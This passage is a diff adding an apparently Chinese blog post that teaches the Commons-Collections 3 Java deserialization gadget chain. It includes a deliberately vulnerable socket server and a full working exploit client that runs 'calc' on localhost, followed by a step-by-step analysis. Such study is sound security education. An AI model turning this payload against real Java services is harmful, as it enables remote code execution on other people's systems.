@@ -1,0 +1,1306 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="漫谈Commons-Collections反序列化, 像清水一般清澈透明">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>漫谈Commons-Collections反序列化 | 像清水一般清澈透明</title>
+    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="像清水一般清澈透明" type="application/atom+xml">
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">像清水一般清澈透明</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">像清水一般清澈透明</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/featureimages/4.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">漫谈Commons-Collections反序列化</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Java-Commons-Collections/">
+                                <span class="chip bg-color">Java Commons-Collections</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-05-26
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    11 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>﻿# 前言</p>
+<p>   如果你没有反序列化的基础，建议你看笔者博客文章先将基础学习一下。如果你没有学习分析过<code>ysoserial--Gadget--URLDNS</code>，建议你看笔者之前发过的文章学习一下。如果你是大佬，前面当笔者没说。<br>   Java的第一个反序列化漏洞就是从<code>commons-collections</code>组件中发现的，从此打开了Java安全的新蓝图。<br>官方对<code>commons-collections</code>组件的说明：<code>The Java Collections Framework was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications. Since that time it has become the recognised standard for collection handling in Java.</code><br>翻译一下大概意思就是：<code>Java commons-collections 框架是JDK 1.2之后中的一个重要补充。增加了许多强大的数据结构，加快了Java应用程序的开发。已经成为Java中公认的集合处理标准。</code><br>   目前<code>commons-collections</code>的反序列化漏洞主要以3和4(版本)为主流，3和4的利用方式也不同，Gadget链也不相同。</p>
+<p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p>
+<hr>
+<h1 id="Commons-Collections3"><a href="#Commons-Collections3" class="headerlink" title="Commons-Collections3"></a>Commons-Collections3</h1><p>   先看一下Gadget链，入口是上篇文章提及的。这里的3是指版本号，笔者这里只分析网上流传的某一条利用链。<code>BadAttributeValueExpException.readObject()</code>类。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></tbody></table></figure>
+<p>   试想一下先存在一个服务器，它正好存在使用<code>commons-collections</code>组件，没有做任何的修复，存在漏洞。此时你是不是就能利用此漏洞呢？</p>
+<hr>
+<h2 id="模拟场景DEMO"><a href="#模拟场景DEMO" class="headerlink" title="模拟场景DEMO"></a><strong>模拟场景DEMO</strong></h2><h3 id="创建模拟服务器应用"><a href="#创建模拟服务器应用" class="headerlink" title="创建模拟服务器应用"></a>创建模拟服务器应用</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        <span class="comment">// 模拟服务器端，接受反序列化数据</span></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">            System.out.println(<span class="string">"服务器监听地址： "</span> + serverSocket.getLocalSocketAddress());</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>){</span><br><span class="line">                <span class="comment">// 接受反序列化数据</span></span><br><span class="line"></span><br><span class="line">                Socket socket = serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"与地址： "</span> + socket.getInetAddress() + <span class="string">"连接！"</span> );</span><br><span class="line">                ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    <span class="comment">// 读取数据</span></span><br><span class="line">                    Object ob = ois.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"读取数据完成！"</span>);</span><br><span class="line">                    System.out.println(ob);</span><br><span class="line"></span><br><span class="line">                } <span class="keyword">catch</span> (ClassNotFoundException e) {</span><br><span class="line">                    System.out.println(<span class="string">"读取数据失败！"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="comment">//目的服务器地址</span></span><br><span class="line">        String tas = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        <span class="comment">// 端口</span></span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">6666</span>;</span><br><span class="line">        <span class="comment">// payload</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}</span><br><span class="line">                ,<span class="keyword">new</span> Object[]{<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]}),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class}</span><br><span class="line">                ,<span class="keyword">new</span> Object[]{<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]}),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"66666!"</span>)</span><br><span class="line"></span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建漏洞map Object</span></span><br><span class="line">        Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建异常，在反序列化时触发payload</span></span><br><span class="line">        BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(expException, entry);</span><br><span class="line">        } <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送payload</span></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(tas,port);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">        oos.writeObject(expException);</span><br><span class="line">        oos.flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="漏洞效果"><a href="#漏洞效果" class="headerlink" title="漏洞效果"></a>漏洞效果</h3><p>首先得让模拟服务器在运行，然后发送payload即可。<br><img src="https://img-blog.csdnimg.cn/20200517150503233.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517150434644.gif" alt="在这里插入图片描述"></p>
+<hr>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>   分析必定要先断点，这里笔者将代码修改了，便于分析。这里就不再贴出，需要的可以去<a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/cc5.java" target="_blank" rel="noopener">GitHub</a>上自取，断点直接设置在<code>readObject</code>方法。<br><code>温馨提示</code>：如果你用的是Idea工具，在Debug之前请查看自己Debugger设置，请和我一样设置。为什么要这么做可以参考：<a href="https://samny.blog.csdn.net/article/details/105937958" target="_blank" rel="noopener">Skipped breakpoint because it happened inside debugger evaluation</a> ，否则你可能出现很多bug。<br><img src="https://img-blog.csdnimg.cn/20200517155502933.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517151930246.png" alt="在这里插入图片描述"></p>
+<hr>
+<h4 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h4><ol>
+<li>一直跟进，到<code>BadAttributeValueException.java</code>的<code>readObject</code>方法。</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/20200517163343981.png" alt="在这里插入图片描述"><br>2. toString方法会跳转到<code>TiedMapEntry</code>的toString方法<br><img src="https://img-blog.csdnimg.cn/20200517163803421.png" alt="在这里插入图片描述"><br>3. 跟进getValue()方法<br><img src="https://img-blog.csdnimg.cn/20200517165203612.png" alt="在这里插入图片描述"><br>4. 跟进到get()方法，在get方法中，会判断<code>key</code>是否存在。然后跳转到<code>transform(key)</code>，这里的key是随便填写的，主要是transform方法是被修改过的，里面有恶意payload。<br><img src="https://img-blog.csdnimg.cn/20200517165322855.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200517165354634.png" alt="在这里插入图片描述"><br>5. 这里是用Java的反射机制，建议去了解一下。推荐博文<a href="https://blog.csdn.net/sun1318578251/category_9977685.html" target="_blank" rel="noopener">从安全角度谈Java反射机制</a><br><img src="https://img-blog.csdnimg.cn/20200517173626405.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517164317458.png" alt="在这里插入图片描述"></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLXN0YXRpYy5jbmJsb2dzLmNvbS9maWxlcy9zYW1ueS9zZXJpYWxpemFibGUzLmdpZg" alt="https://blog-static.cnblogs.com/files/samny/serializable3.gif"><br>   看完整个完整的过程，每一步都对应着文章开头的Gadget chain。创建异常类<code>BadAttributeValueExpException</code>，以便于在反序列化时触发payload。<br><img src="https://img-blog.csdnimg.cn/2020051814514391.png" alt="在这里插入图片描述"></p>
+<hr>
+<h4 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h4><p>   过程看完了，但是我们还是无法理解为什么可以这么构造，还是得一步步看POC源码。我们一一对着官方文档分析函数方法的具体作用。</p>
+<ol>
+<li>ChainedTransformer将一个个Transformer类数组按照顺序一个个执行，前一个运行结果作为第二个transform。<br><img src="https://img-blog.csdnimg.cn/20200517173011310.png" alt="在这里插入图片描述"></li>
+<li>ConstantTransformer调用transform方法，返回类在实例化时存储的类。<br><img src="https://img-blog.csdnimg.cn/20200517173510549.png" alt="在这里插入图片描述"></li>
+<li>InvokerTransformer调用transform方法的时候，根据类在实例化时提供的参数，通过反射去调用对象的方法。InvokerTransformer第一个参数是方法名，第二个参数是参数类型，第三个参数是参数值。</li>
+</ol>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(java.lang.String methodName,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Class[] paramTypes,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Object[] args)</span></span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200517175953505.png" alt="在这里插入图片描述"><br>   这是一段反射执行命令的代码，这段执行的效果完全等效于transformers[]数组，下面两张图片可以完美的诠释。</p>
+<figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">           <span class="comment">//实例化对象</span></span><br><span class="line">          Object ob = cls.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">           <span class="comment">// 反射调用执行命令</span></span><br><span class="line">           cls.getMethod("exec", String.class).invoke(ob,"calc");</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200517164708950.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200517175632226.png" alt="在这里插入图片描述"></p>
+<hr>
+<p>   创建一个HashMap，使用LazyMap.decorate()方法传入HashMap和Transformer数组。其中数组是我们构造的payload，最后使用TiedMapEntry传入一个key。其实也可以这样子<code>lazymap.get("Summer")</code>也可以传入key，这样子会在序列化过程就将key写入，而在反序列化的时候不会调用<code>LazyMap.get()</code>方法，判断key是否存在。不存在则会调用<code>this.factory.transform(key);</code>方法，进而触发反序列化漏洞。所以很显然这种方法不可取，只能通过修改底层的方式，加入key值，以便于在反序列化的时候触发漏洞，并同时确保在序列化的过程不会触发漏洞。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">      Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">      TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200518095025914.png" alt="在这里插入图片描述"><br>   到目前为止，并没有触发反序列化漏洞的入口。而<code>BadAttributeValueExpException</code>这个类是javax.management报下的一个类，是jdk自带的，无需依赖第三方。它继承了Serializable接口满足反序列化漏洞的条件，它只有一个值权限是private不可修改，但利用反射机制修改其值来到达触发反序列化漏洞的目的。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">       <span class="keyword">try</span> {</span><br><span class="line">           Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">           field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           field.set(expException, entry);</span><br><span class="line"></span><br><span class="line">       } <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) {</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       }</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
